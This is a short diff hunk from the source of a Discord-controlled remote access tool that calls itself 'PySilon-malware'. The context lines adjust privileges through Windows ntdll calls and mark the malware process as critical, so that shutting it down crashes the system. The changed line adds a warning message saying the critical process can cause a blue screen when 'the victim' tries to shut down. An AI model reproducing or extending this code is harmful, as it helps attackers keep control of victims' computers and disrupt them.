@@ -467,7 +467,7 @@ async def on_message(message):
                     ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                     ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                     #.log Set PySilon as a critical process
-                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.```', colour=discord.Colour.purple())
+                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent success message
